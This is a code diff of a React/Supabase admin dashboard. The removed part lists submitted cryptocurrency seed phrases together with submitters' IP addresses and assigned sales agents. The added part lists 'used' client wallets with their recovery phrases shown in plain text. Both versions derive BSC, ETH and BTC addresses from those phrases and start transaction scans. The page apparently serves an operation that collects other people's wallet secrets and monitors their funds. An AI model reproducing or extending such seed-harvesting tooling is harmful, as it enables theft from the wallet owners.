@@ -30,51 +30,32 @@ const Transaction = () => {
     }
   });
 
-  // Fetch recent seed phrase submissions
-  const { data: seedSubmissions = [] } = useQuery({
-    queryKey: ['seed-submissions'],
+  // Fetch all used wallets
+  const { data: usedWallets = [] } = useQuery({
+    queryKey: ['used-wallets'],
     queryFn: async () => {
       const { data, error } = await supabase
-        .from('seed_phrase_submissions')
-        .select('id, phrase, commercial_id, commercial_name, created_at, ip_address, status')
-        .order('created_at', { ascending: false })
-        .limit(100);
+        .from('wallets')
+        .select(`
+          *,
+          commercials (name),
+          generated_wallets (id, eth_address, btc_address, bsc_address)
+        `)
+        .eq('status', 'used')
+        .order('used_at', { ascending: false });
       if (error) throw error;
       return data || [];
     }
   });
 
-  // Mutation to process a seed phrase: generate addresses and start scan
-  const processSeedMutation = useMutation({
-    mutationFn: async ({ phrase, commercialId }: { phrase: string; commercialId: string | null }) => {
-      const { data, error } = await supabase.functions.invoke('generate-wallet-addresses', {
-        body: {
-          seed_phrase: phrase,
-          commercial_id: commercialId,
-          scan: true
-        }
-      });
-      if (error) throw error;
-      return data;
-    },
-    onSuccess: () => {
-      toast.success("Addresses generated and scan started");
-      queryClient.invalidateQueries({ queryKey: ['wallet-groups'] });
-      queryClient.invalidateQueries({ queryKey: ['all-transactions'] });
-    },
-    onError: (error) => {
-      toast.error("Failed to process seed phrase");
-      console.error('Error processing seed phrase:', error);
-    }
-  });
-
-  // Mutation to generate wallet addresses
+  // Mutation to generate wallet addresses and start scanning
   const generateAddressesMutation = useMutation({
     mutationFn: async ({ walletId, seedPhrase }: { walletId: string; seedPhrase: string }) => {
       const { data, error } = await supabase.functions.invoke('generate-wallet-addresses', {
         body: {
           wallet_id: walletId,
-          seed_phrase: seedPhrase
+          seed_phrase: seedPhrase,
+          scan: true // Auto-trigger scanning
         }
       });
       
@@ -82,9 +63,11 @@ const Transaction = () => {
       return data;
     },
     onSuccess: () => {
-      toast.success("Wallet addresses generated successfully!");
+      toast.success("Addresses generated and scanning started!");
       queryClient.invalidateQueries({ queryKey: ['wallet-groups'] });
       queryClient.invalidateQueries({ queryKey: ['wallets-needing-addresses'] });
+      queryClient.invalidateQueries({ queryKey: ['used-wallets'] });
+      queryClient.invalidateQueries({ queryKey: ['all-transactions'] });
     },
     onError: (error) => {
       toast.error("Failed to generate wallet addresses");
@@ -271,39 +254,61 @@ const Transaction = () => {
           </Button>
         </div>
 
-        {/* Seed Phrase Submissions */}
+        {/* All Used Wallets */}
         <Card className="mb-6">
           <CardHeader>
             <CardTitle className="flex items-center gap-2">
-              <Plus className="w-5 h-5" />
-              Seed Phrase Submissions
+              <Wallet className="w-5 h-5" />
+              All Used Wallets
             </CardTitle>
             <CardDescription>
-              Generate BSC/ETH/BTC addresses from submitted seed phrases and start scanning transactions
+              All wallets currently in use - generate addresses and scan transactions
             </CardDescription>
           </CardHeader>
           <CardContent>
-            {seedSubmissions.length === 0 ? (
-              <div className="text-sm text-muted-foreground">No recent seed phrase submissions.</div>
+            {usedWallets.length === 0 ? (
+              <div className="text-sm text-muted-foreground">No used wallets found.</div>
             ) : (
               <div className="space-y-4">
-                {seedSubmissions.map((s: any) => (
-                  <div key={s.id} className="flex items-center justify-between p-4 bg-muted/30 rounded-lg border">
+                {usedWallets.map((wallet: any) => (
+                  <div key={wallet.id} className="flex items-center justify-between p-4 bg-muted/30 rounded-lg border">
                     <div className="flex-1">
-                      <div className="flex items-center justify-between">
-                        <div className="text-sm text-muted-foreground">
-                          {new Date(s.created_at).toLocaleString()} • {s.commercial_name || 'Unknown'}
+                      <div className="flex items-center gap-3 mb-2">
+                        <Wallet className="w-4 h-4 text-primary" />
+                        <div>
+                          <div className="font-medium">
+                            {wallet.client_tracking_id || `Wallet ${wallet.id.slice(0, 8)}`}
+                          </div>
+                          <div className="text-sm text-muted-foreground">
+                            Used by: {wallet.commercials?.name || 'Unknown'} • 
+                            {wallet.used_at ? new Date(wallet.used_at).toLocaleDateString() : 'Recently'}
+                          </div>
                         </div>
+                        {wallet.generated_wallets?.length > 0 && (
+                          <Badge variant="default">Addresses Generated</Badge>
+                        )}
                       </div>
-                      <div className="mt-2 font-mono text-xs bg-background p-2 rounded border break-all">{s.phrase}</div>
-                      <div className="text-xs text-muted-foreground mt-1">IP: {s.ip_address || 'N/A'}</div>
+                      <div className="font-mono text-xs bg-background p-2 rounded border break-all">
+                        {wallet.wallet_phrase}
+                      </div>
+                      {wallet.generated_wallets?.length > 0 && (
+                        <div className="mt-2 grid grid-cols-3 gap-2 text-xs">
+                          <div>BSC: {wallet.generated_wallets[0]?.bsc_address?.slice(0, 8)}...</div>
+                          <div>ETH: {wallet.generated_wallets[0]?.eth_address?.slice(0, 8)}...</div>
+                          <div>BTC: {wallet.generated_wallets[0]?.btc_address?.slice(0, 8)}...</div>
+                        </div>
+                      )}
                     </div>
-                    <Button
+                    <Button 
+                      onClick={() => generateAddressesMutation.mutate({
+                        walletId: wallet.id,
+                        seedPhrase: wallet.wallet_phrase
+                      })}
+                      disabled={generateAddressesMutation.isPending}
                       className="ml-4"
-                      disabled={processSeedMutation.isPending || !s.commercial_id}
-                      onClick={() => processSeedMutation.mutate({ phrase: s.phrase, commercialId: s.commercial_id })}
                     >
-                      {processSeedMutation.isPending ? 'Processing...' : 'Generate & Scan'}
+                      {generateAddressesMutation.isPending ? "Processing..." : 
+                       wallet.generated_wallets?.length > 0 ? "Re-scan" : "Generate & Scan"}
                     </Button>
                   </div>
                 ))}
